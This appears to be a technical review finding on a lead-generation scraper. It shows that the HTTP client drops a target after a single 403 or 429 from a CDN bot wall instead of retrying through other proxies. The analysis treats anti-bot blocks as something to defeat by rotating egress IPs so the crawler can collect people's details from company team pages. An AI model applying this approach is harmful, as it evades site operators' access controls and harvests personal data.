**What happens.** The module docstring (line 10) advertises "WAF / 403 / captcha detection - short-circuits to retry layer". There is no retry layer for the lead path. `get()` returns None on 403, on 429, and on a heuristic block, after exactly one attempt through exactly one proxy — it never re-enters `acquire()` to try a different egress. The urllib3 `Retry` at line 357 cannot help either: `status_forcelist=(500, 502, 503, 504)` excludes 403/429 by design, and even if it did retry it would reuse the same proxy and the same connection. The only caller with a retry loop is deep_scrape (`for attempt in range(cfg.max_retries + 1)`), and deep_scrape is explicitly disabled in both lead configs (`deep_scrape: false`). The actual person-discovery crawler, `src/leadgen/person/cascade.py`, calls `http.get(url)` once at line 62 and once at line 122 with no loop anywhere in src/leadgen (`grep -rn 'for attempt|range(.*retries|retry' src/leadgen/` returns only a comment).

**Failure.** The pipeline reaches hellofresh.de/about/team. Proxy #4 gets a 403 from the CDN. get() returns None, proxy #4 is penalised, and cascade.py drops the company. Proxies #5-#20 — which might well have succeeded, since bot-wall verdicts vary by IP reputation and by luck — are never tried. Given that 4 of 6 probed EU domains 403 a first attempt, the pipeline is discarding the majority of its target companies on a single coin flip each.
